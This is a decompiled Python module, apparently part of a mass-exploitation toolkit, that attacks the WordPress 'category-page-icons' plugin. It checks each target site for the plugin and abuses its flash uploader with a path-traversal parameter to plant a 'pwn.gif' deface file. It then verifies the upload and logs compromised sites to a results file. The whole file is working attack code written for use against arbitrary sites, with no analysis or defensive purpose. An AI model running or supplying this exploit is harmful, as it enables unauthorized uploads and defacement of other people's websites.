# uncompyle6 version 2.11.5
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.18 (default, Apr 20 2020, 20:30:41) 
# [GCC 9.3.0]
# Embedded file name: Exploits\WpCateGory_page_icons.py
import requests
from Exploits import printModule
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
r = '\x1b[31m'
g = '\x1b[32m'
y = '\x1b[33m'
b = '\x1b[34m'
m = '\x1b[35m'
c = '\x1b[36m'
w = '\x1b[37m'
Jce_Deface_image = 'files/pwn.gif'

def Exploit(site):
    try:
        ChckVln = requests.get('http://' + site + '/wp-content/plugins/category-page-icons/css/menu.css', timeout=5, headers=Headers)
        if ChckVln.status_code == 200:
            Exp = 'http://' + site + '/wp-content/plugins/category-page-icons/include/wpdev-flash-uploader.php'
            fileDeface = {'wpdev-async-upload': open(Jce_Deface_image, 'rb')}
            PostDAta = {'dir_icons': '../../../','submit': 'upload'
               }
            requests.post(Exp, files=fileDeface, data=PostDAta, timeout=5, headers=Headers)
            CheckIndex = requests.get('http://' + site + '/wp-content/' + Jce_Deface_image.split('/')[1], timeout=5, headers=Headers)
            if 'GIF89a' in CheckIndex.content:
                with open('result/Index_results.txt', 'a') as writer:
                    writer.write(site + '/wp-content/' + Jce_Deface_image.split('/')[1] + '\n')
                return printModule.returnYes(site, 'N/A', 'category-page-icons', 'Wordpress')
            else:
                return printModule.returnNo(site, 'N/A', 'category-page-icons', 'Wordpress')

        else:
            return printModule.returnNo(site, 'N/A', 'category-page-icons', 'Wordpress')
    except:
        return printModule.returnNo(site, 'N/A', 'category-page-icons', 'Wordpress')